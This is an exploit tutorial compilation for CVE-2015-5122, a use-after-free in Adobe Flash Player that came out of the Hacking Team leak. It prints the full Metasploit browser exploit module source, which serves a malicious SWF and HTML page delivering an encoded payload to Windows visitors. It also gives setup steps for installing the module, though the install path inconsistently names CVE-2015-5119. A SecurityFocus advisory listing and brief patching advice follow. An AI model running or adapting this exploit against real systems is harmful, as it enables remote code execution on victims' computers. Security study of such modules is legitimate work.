Adobe Flash Player CVE-2015-5122 Use After Free Remote Memory Corruption Vulnerability
	- Windows 8.1
	- Firefox
	- Vulnerable version Flash Player(18.0.0.203)

The CVE-2015-5122 (Adobe Flash opaqueBackground Use After Free) zero day Flash Exploit module in Metasploit and have a vulnerable setup download the malicious Flash file. Recent versions of Adobe Flash Player contain critical vulnerabilities within the ActionScript 3 ByteArray, opaqueBackground and BitmapData classes. Exploiting one of these vulnerabilities could allow a remote attacker to execute arbitrary code on the vulnerable system. CVE-2015-5122 is the 3rd zero-day exploit from the Hacking Team data breach and targets the Adobe Flash Player (18.0.0.203) on Windows 7, Windows 8.1 and Google Chrome on Linux based computers. By the time of writing Adobe has already released security updates for Windows, Mac and Linux



[Exploit Code]

https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/browser/adobe_flash_opaque_background_uaf.rb

https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/CVE-2015-5122

Add it to the following directory:

/usr/share/metasploit-framework/data/exploits/CVE-2015-5119/msf.swf

[METASPLOIT]

metasploit-framework/modules/exploits/multi/browser/adobe_flash_opaque_background_uaf.rb



[SOURCE CODE]

##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::BrowserExploitServer

  def initialize(info={})
    super(update_info(info,
      'Name'                => 'Adobe Flash opaqueBackground Use After Free',
      'Description'         => %q{
        This module exploits an use after free on Adobe Flash Player. The vulnerability,
        discovered by Hacking Team and made public as part of the July 2015 data leak, was
        described as an Use After Free while handling the opaqueBackground property
        7 setter of the flash.display.DisplayObject class. This module is an early release
        tested on:

        Windows XP SP3, IE8 and Flash 18.0.0.194,
        Windows XP SP3, IE 8 and Flash 18.0.0.203,
        Windows XP SP3, Firefox and Flash 18.0.0.203,
        Windows Vista SP2 + IE 9 and Flash 18.0.0.203,
        Windows Vista SP2 + Firefox 39.0 and Flash 18.0.0.203,
        Windows 7 SP1 (32-bit), IE11 and Adobe Flash 18.0.0.203,
        Windows 7 SP1 (32-bit), Firefox 38.0.5 and Adobe Flash 18.0.0.194,
        Windows 7 SP1 (32-bit), IE9 and Adobe Flash Flash 18.0.0.203,
        Windows 7 SP1 (32-bit), Firefox and Adobe Flash 18.0.0.194,
        Windows 8.1 (32-bit), IE11 and Adobe Flash 18.0.0.194,
        windows 8.1 (32-bit), Firefox and Adobe Flash 18.0.0.203,
        Windows 8.1 (32-bit), Firefox and Adobe Flash 18.0.0.160 and
        Windows 8.1 (32-bit), Firefox and Adobe Flash 18.0.0.194
      },
      'License'             => MSF_LICENSE,
      'Author'              =>
        [
          'Unknown',      # Vulnerability discovered on HackingTeam info leak
          'juan vazquez', # Ported to Msf
          'sinn3r'        # Testing and some editing
        ],
      'References'          =>
        [
          ['CVE', '2015-5122'],
          ['URL', 'https://www.fireeye.com/blog/threat-research/2015/07/cve-2015-5122_-_seco.html'],
          ['URL', 'https://helpx.adobe.com/security/products/flash-player/apsa15-04.html'],
          ['URL', 'https://helpx.adobe.com/security/products/flash-player/apsb15-18.html']
        ],
      'Payload'             =>
        {
          'DisableNops' => true
        },
      'Platform'            => ['win'],
      'Arch'                => [ARCH_X86],
      'BrowserRequirements' =>
        {
          :source  => /script|headers/i,
          :arch    => ARCH_X86,
          :os_name => lambda do |os|
            os =~ OperatingSystems::Match::WINDOWS_XP ||
            os =~ OperatingSystems::Match::WINDOWS_VISTA ||
            os =~ OperatingSystems::Match::WINDOWS_7 ||
            os =~ OperatingSystems::Match::WINDOWS_81
          end,
          :ua_name => lambda do |ua|
            case target.name
            when 'Windows'
              return true if ua == Msf::HttpClients::IE || ua == Msf::HttpClients::FF
            end

            false
          end,
          :flash   => lambda do |ver|
            case target.name
            when 'Windows'
              return true if ver =~ /^18\./ && Gem::Version.new(ver) <= Gem::Version.new('18.0.0.203')
            end

            false
          end
        },
      'Targets'             =>
        [
          [ 'Windows',
            {
              'Platform' => 'win'
            }
          ]
        ],
      'Privileged'          => false,
      'DisclosureDate'      => 'Jul 06 2015',
      'DefaultTarget'       => 0))
  end

  def exploit
    @swf = create_swf

    super
  end

  def on_request_exploit(cli, request, target_info)
    print_status("Request: #{request.uri}")

    if request.uri =~ /\.swf$/
      print_status('Sending SWF...')
      send_response(cli, @swf, {'Content-Type'=>'application/x-shockwave-flash', 'Cache-Control' => 'no-cache, no-store', 'Pragma' => 'no-cache'})
      return
    end

    print_status('Sending HTML...')
    send_exploit_html(cli, exploit_template(cli, target_info), {'Pragma' => 'no-cache'})
  end

  def exploit_template(cli, target_info)
    swf_random = "#{rand_text_alpha(4 + rand(3))}.swf"
    target_payload = get_payload(cli, target_info)
    b64_payload = Rex::Text.encode_base64(target_payload)
    platform_id = 'win'

    html_template = %Q|<html>
    <body>
    <object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab" width="1" height="1" />
    <param name="movie" value="<%=swf_random%>" />
    <param name="allowScriptAccess" value="always" />
    <param name="FlashVars" value="sh=<%=b64_payload%>&pl=<%=platform_id%>" />
    <param name="Play" value="true" />
    <embed type="application/x-shockwave-flash" width="1" height="1" src="<%=swf_random%>" allowScriptAccess="always" FlashVars="sh=<%=b64_payload%>&pl=<%=platform_id%>" Play="true"/>
    </object>
    </body>
    </html>
    |

    return html_template, binding()
  end

  def create_swf
    path = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2015-5122', 'msf.swf')
    swf =  ::File.open(path, 'rb') { |f| swf = f.read }

    swf
  end
end


http://www.securityfocus.com/bid/75712

Adobe Flash Player CVE-2015-5122 Use After Free Remote Memory Corruption Vulnerability

Bugtraq ID:	75712
Class:	Unknown
CVE:	CVE-2015-5122
CVE-2015-5122
Remote:	Yes
Local:	No
Published:	Jul 13 2015 12:00AM
Updated:	Sep 17 2015 12:21PM
Credit:	Dhanesh Kizhakkinan of FireEye
Vulnerable:	Red Hat Enterprise Linux Workstation Supplementary 6
Red Hat Enterprise Linux Supplementary 5 server
Red Hat Enterprise Linux Server Supplementary 6
Red Hat Enterprise Linux Desktop Supplementary 6
Red Hat Enterprise Linux Desktop Supplementary 5 client
HP Virtual Connect Enterprise Manager 6.2
HP Virtual Connect Enterprise Manager 6.1
HP Virtual Connect Enterprise Manager 6.0
HP Version Control Agent 2.1.5 
HP Systems Insight Manager 7.0
HP Systems Insight Manager 6.3
HP Systems Insight Manager 6.2
HP Systems Insight Manager 6.1
HP Systems Insight Manager 6.0
HP Systems Insight Manager 5.3
HP Systems Insight Manager 5.0
HP Systems Insight Manager 4.2
HP System Management Homepage 6.2.2 7
HP System Management Homepage 3.0.2 .77
HP System Management Homepage 3.0 .68
HP System Management Homepage 3.0 .64
HP System Management Homepage 2.2.9 .1
HP System Management Homepage 2.2.8 
HP System Management Homepage 2.2.6 
HP System Management Homepage 2.1.12 
HP System Management Homepage 2.1.11 
HP System Management Homepage 2.1.10 
HP System Management Homepage 2.1.9 
HP System Management Homepage 2.1.8 
HP System Management Homepage 2.1.7 
HP System Management Homepage 2.1.6 
HP System Management Homepage 2.1.5 
HP System Management Homepage 2.1.4 
HP System Management Homepage 2.1.3 
HP System Management Homepage 2.1.2 
HP System Management Homepage 2.1.1 
HP System Management Homepage 2.1 
HP System Management Homepage 2.0.2 
HP System Management Homepage 2.0.1 
HP System Management Homepage 2.0 
HP System Management Homepage 7.0
HP System Management Homepage 6.3
HP System Management Homepage 6.2
HP System Management Homepage 6.0
HP Insight Orchestration 6.2
HP Insight Orchestration 6.1
HP Insight Orchestration 6.0
Gentoo Linux 
Adobe Flash Player 10.1.53 .64
Adobe Flash Player 10.1.51 .66
Adobe Flash Player 10.0.45 2
Adobe Flash Player 10.0.32 18
Adobe Flash Player 10.0.22 .87
Adobe Flash Player 10.0.15 .3
Adobe Flash Player 10.0.12 .36
Adobe Flash Player 10.0.12 .35
Adobe Flash Player 9.0.262 
Adobe Flash Player 9.0.246 0
Adobe Flash Player 9.0.152 .0
Adobe Flash Player 9.0.151 .0
Adobe Flash Player 9.0.124 .0
Adobe Flash Player 9.0.48.0
Adobe Flash Player 9.0.47.0
Adobe Flash Player 9.0.45.0
Adobe Flash Player 9.0.31.0
Adobe Flash Player 9.0.289.0
Adobe Flash Player 9.0.283.0
Adobe Flash Player 9.0.280
Adobe Flash Player 9.0.28.0
Adobe Flash Player 9.0.277.0
Adobe Flash Player 9.0.262.0
Adobe Flash Player 9.0.260.0
Adobe Flash Player 9.0.246.0
Adobe Flash Player 9.0.159.0
Adobe Flash Player 9.0.155.0
Adobe Flash Player 9.0.115.0
Adobe Flash Player 9
Adobe Flash Player 8.0.35.0
Adobe Flash Player 8.0.34.0
Adobe Flash Player 8
Adobe Flash Player 7.0.73.0
Adobe Flash Player 7.0.70.0
Adobe Flash Player 7.0.69.0
Adobe Flash Player 7.0.68.0
Adobe Flash Player 7.0.67.0
Adobe Flash Player 7.0.66.0
Adobe Flash Player 7.0.61.0
Adobe Flash Player 7.0.60.0
Adobe Flash Player 7.0.53.0
Adobe Flash Player 7.0.24.0
Adobe Flash Player 7.0.19.0
Adobe Flash Player 7.0.14.0
Adobe Flash Player 7
Adobe Flash Player 6.0.79
Adobe Flash Player 6.0.21.0
Adobe Flash Player 11.2.202.235
Adobe Flash Player 11.2.202.233
Adobe Flash Player 11.2.202.229
Adobe Flash Player 11.2.202.223
Adobe Flash Player 11.1.115.8
Adobe Flash Player 11.1.115.7
Adobe Flash Player 11.1.115.6
Adobe Flash Player 11.1.112.61
Adobe Flash Player 11.1.111.9
Adobe Flash Player 11.1.111.8
Adobe Flash Player 11.1.111.7
Adobe Flash Player 11.1.111.6
Adobe Flash Player 11.1.111.5
Adobe Flash Player 11.1.102.63
Adobe Flash Player 11.1.102.62
Adobe Flash Player 11.1.102.55
Adobe Flash Player 11.1.102.228
Adobe Flash Player 11.0.1.152
Adobe Flash Player 10.3.186.7
Adobe Flash Player 10.3.186.6
Adobe Flash Player 10.3.186.3
Adobe Flash Player 10.3.186.2
Adobe Flash Player 10.3.185.25
Adobe Flash Player 10.3.185.23
Adobe Flash Player 10.3.185.22
Adobe Flash Player 10.3.185.21
Adobe Flash Player 10.3.183.7
Adobe Flash Player 10.3.183.5
Adobe Flash Player 10.3.183.4
Adobe Flash Player 10.3.183.10
Adobe Flash Player 10.3.181.34
Adobe Flash Player 10.3.181.26
Adobe Flash Player 10.3.181.23
Adobe Flash Player 10.3.181.22
Adobe Flash Player 10.3.181.16
Adobe Flash Player 10.3.181.14
Adobe Flash Player 10.2.159.1
Adobe Flash Player 10.2.157.51
Adobe Flash Player 10.2.156.12
Adobe Flash Player 10.2.154.28
Adobe Flash Player 10.2.154.27
Adobe Flash Player 10.2.154.25
Adobe Flash Player 10.2.154.24
Adobe Flash Player 10.2.154.18
Adobe Flash Player 10.2.154.13
Adobe Flash Player 10.2.153.1
Adobe Flash Player 10.2.152.33
Adobe Flash Player 10.2.152.32
Adobe Flash Player 10.2.152.21
Adobe Flash Player 10.2.152
Adobe Flash Player 10.1.95.2
Adobe Flash Player 10.1.95.1
Adobe Flash Player 10.1.92.8
Adobe Flash Player 10.1.92.10
Adobe Flash Player 10.1.85.3
Adobe Flash Player 10.1.82.76
Adobe Flash Player 10.1.52.15
Adobe Flash Player 10.1.52.14.1
Adobe Flash Player 10.1.106.16
Adobe Flash Player 10.1.105.6
Adobe Flash Player 10.1.102.65
Adobe Flash Player 10.1.102.64
Adobe Flash Player 10.0.42.34
Adobe Flash Player 10.0.32.18
Adobe Flash Player 10

[COUNTERMEASURES]

How to avoid getting infected by CVE-2015-5122 and other exploits…

– Update Flash Player and keep it up-to-date.
– Install security patches and keep your OS up-to-date.
– Install a virus scanner and firewall and keep it updated.
– Keep your browser up-to-date.
– Do not install unneeded plug-ins.


http://www.hackingtutorials.org/metasploit-tutorials/metasploit-cve-2015-5122-flash-exploit-tutorial/



